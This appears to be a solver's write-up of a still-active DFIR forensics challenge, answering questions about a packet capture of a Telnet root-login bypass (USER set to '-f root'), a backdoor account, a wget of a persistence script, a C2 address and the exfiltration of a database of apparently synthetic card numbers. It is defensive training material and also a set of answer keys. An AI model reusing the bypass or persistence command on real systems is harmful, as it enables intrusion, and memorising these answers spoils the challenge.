- **Date**: Wednesday, May 13, 2026
- **Username**: cartofelplm
- **Difficulty**: Very Easy
- **Tags**: #SOC #Unauthorized_Access #CVE #Telnet 
- **Scenario**: You are a Junior DFIR Analyst at an MSSP that provides continuous monitoring and DFIR services to SMBs. Your supervisor has tasked you with analyzing network telemetry from a compromised backup server. A DLP solution flagged a possible data exfiltration attempt from this server. According to the IT team, this server wasn't very busy and was sometimes used to store backups.
- **Sherlock Info**: none -- still acitve
- **Official Writeup**: none yet
- **Video Walkthrough**: none yet
- **Impression**: really nice

---
# Artefacts

We are provided with one `.pcapng` files: `monitoringservice_export_202610AM-11AM.pcapng` that we will analyze later on. Based on the Sherlock Scenario, it includes network telemetry information from the compromised backup server.  

---
# Questions

1. What CVE is associated with the vulnerability exploited in the Telnet protocol?

**Answer**: CVE-2026-24061

Hint: In Wireshark, apply a telnet display filter. In packet number 52, you'll see the USER environment variable being set with the value -f root. That behavior is the underlying cause of the vulnerability. If you Google this detail, you should be able to find the corresponding CVE. You can also follow the TCP Stream, which will show you all the telnet commands exchanged between attacker and victim in both directions.

We follow the hint and get to [this](https://www.safebreach.com/blog/safebreach-labs-root-cause-analysis-and-poc-exploit-for-cve-2026-24061/) website where the vulnerability is explained clearly. In short, "this flaw allows an attacker to establish a Telnet session without providing valid credentials, granting unauthorized access to the target system.". A remote attacker could set the Telnet `USER` environment variable to something like `-f root`, and `telnetd` would pass it unsafely to `/usr/bin/login`. `login` interpreted that as “log in as root without asking for a password,” giving the attacker a root shell.

The corresponding telnet package is:

![[Telly-1778704094270.webp]]

We can also take a look at the TCP stream, as indicated in the hint:

![[Telly-1778704135093.webp]]

We can see the telnet commands exchanged between the attacker and the victim. 

2. When was the Telnet vulnerability successfully exploited, granting the attacker remote root access on the target machine?

**Answer**: 2026-01-27 10:39:28

Hint: In packet 52, you'll see the USER environment variable set to -f root, which is the underlying cause of the vulnerability. Use the timestamp shown for that packet in the main packet list to determine when the exploit occurred. You can also follow the TCP Stream, which will show you all the telnet commands exchanged between attacker and victim in both directions.

We follow the hint and take notice the time when packet 52 has been sent:

![[Telly-1778704413785.webp]]

3. What is the hostname of the targeted server?

**Answer**: backup-secondary

Hint: When a Telnet session starts, the server sends a login banner. That banner typically includes the kernel release/version and the hostname, use it to identify the target host's name. You can also follow the TCP Stream, which will show you all the telnet commands exchanged between attacker and victim in both directions.

We follow the TCP stream as indicated in the hint, and identify the hostname of the targeted server:

![[Telly-1778704628041.webp]]

4. The attacker created a backdoor account to maintain future access. What username and password were set for that account?

**Answer**: cleanupsvc:YouKnowWhoiam69

Hint: In packet 2451, inspect the Telnet payload (Follow → TCP Stream) to see the exact command the attacker sent to create the user. The command itself will reveal both the username and the password that were used. You can also follow the TCP Stream, which will show you all the telnet commands exchanged between attacker and victim in both directions.

We follow the TCP stream and look for the keyword `useradd`. 

![[Telly-1778704801898.webp]]

This suggests that the attacker added the user to the system for persistance.

5. What was the full command the attacker used to download the persistence script?

**Answer**: `wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh`

Hint: In packet 3968, you'll find a GitHub link to the script. The packets immediately before it contain one character each. Starting from packet 3939, you can reconstruct the full command by piecing those characters together (letter by letter) up to the link. You can also follow the TCP Stream, which will show you all the telnet commands exchanged between attacker and victim in both directions. You can also follow the TCP Stream, which will show you all the telnet commands exchanged between attacker and victim in both directions.

It is much easier to determine this from the TCP stream by looking for keywords such as `curl` and `wget`.

![[Telly-1778705157962.webp]]

6. The attacker installed remote access persistence using the persistence script. What is the C2 IP address?

**Answer**: 91.99.25.54

Hint: Check packet 6416. You can also follow the TCP Stream, which will show you all the telnet commands exchanged between attacker and victim in both directions.

We take a look at the TCP stream:

![[Telly-1778705266510.webp]]

7. The attacker exfiltrated a sensitive database file. At what time was this file exfiltrated?

**Answer**: 2026-01-27 10:49:54

Hint: From packets 8043 to 8696, you will see the attacker opened a Python web server. The web server module was running in a staging directory where the sensitive file existed on the server. Packet 9377 contains the GET request for the exfiltrated file. You can also follow the TCP Stream, which will show you all the telnet commands exchanged between attacker and victim in both directions.

The hint is in fact a good explanation of what we did before reading it. 

![[Telly-1778705744635.webp]]

8. Analyze the exfiltrated database. To follow compliance requirements, the breached organization needs to notify its customers. For data validation purposes, find the credit card number for a customer named Quinn Harris.

**Answer**: 5312269047781209

Hint: Export the database file using Wireshark 'Export Objects' feature. You can then open the database file in DB Browser for SQLite to query the customer data. You can also follow the TCP Stream, which will show you all the telnet commands exchanged between attacker and victim in both directions.

We follow the hint:

![[Telly-1778706938144.webp]]

We open the database and we get the credit card:

```
└──╼ [*]$ sqlite3 credit-cards-25-blackfriday.db 
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.

sqlite> .tables
purchases

sqlite> select * from purchases;
1|alex.morgan@gmail.com|4539682995824395|2025-11-27|Wireless earbuds
2|sam.taylor@hotmail.com|5424187310928476|2025-11-28|Laptop
3|jordan.lee@gmail.com|4916738021459982|2025-11-29|Smartphone
4|casey.park@hotmail.com|5190026847315569|2025-11-30|Bluetooth speaker
5|taylor.chen@gmail.com|4023567190842237|2025-12-01|Smartwatch
6|morgan.ross@hotmail.com|5578129403617724|2025-12-02|Tablet
7|jamie.khan@gmail.com|4485123096741186|2025-12-03|USB-C hub
8|riley.patel@hotmail.com|5109346672819053|2025-12-04|External SSD
9|devon.ng@gmail.com|4670912384567021|2025-12-05|Gaming mouse
10|skyler.wong@hotmail.com|5234907812669348|2025-12-06|Mechanical keyboard
11|avery.singh@gmail.com|4147098863215504|2025-12-07|Noise-cancelling headphones
12|quinn.harris@hotmail.com|5312269047781209|2025-12-08|4K monitor
13|reese.clark@gmail.com|4019283746650197|2025-12-09|Portable charger
14|peyton.adams@hotmail.com|5561048937712906|2025-12-10|Wi-Fi router
15|harper.baker@gmail.com|4920187364501293|2025-12-11|Action camera
16|rowan.mills@hotmail.com|5408619927743018|2025-12-12|Drone
17|drew.evans@gmail.com|4638201947563317|2025-12-02|E-reader
18|logan.scott@hotmail.com|5207743198604425|2025-11-27|Smart home camera
19|kai.reed@gmail.com|4096127735501842|2025-12-06|Smart light bulbs
20|blake.turner@hotmail.com|5536901274485011|2025-11-30|VR headset
21|finley.hughes@gmail.com|4701832699047716|2025-12-01|Graphics tablet
22|river.ward@hotmail.com|5162087341196502|2025-12-09|Fitness tracker
23|charlie.diaz@gmail.com|4267091182306649|2025-12-03|Streaming stick
24|emerson.gray@hotmail.com|5478123065901147|2025-11-28|Portable projector
25|sage.brooks@gmail.com|4156609273184408|2025-12-10|Dash cam
26|cameron.bell@hotmail.com|5299001843765520|2025-12-04|Microphone
27|dakota.cooper@gmail.com|4381176029950315|2025-12-07|Webcam
28|marley.howard@hotmail.com|5523419876027783|2025-11-29|Surge protector power strip
29|phoenix.price@gmail.com|4619920371846650|2025-12-05|Electric toothbrush
30|jesse.ramos@hotmail.com|5183762094419087|2025-12-08|Raspberry Pi starter kit
```

---
# Tools Used

List of tools/commands used: #sqlite #wireshark

---
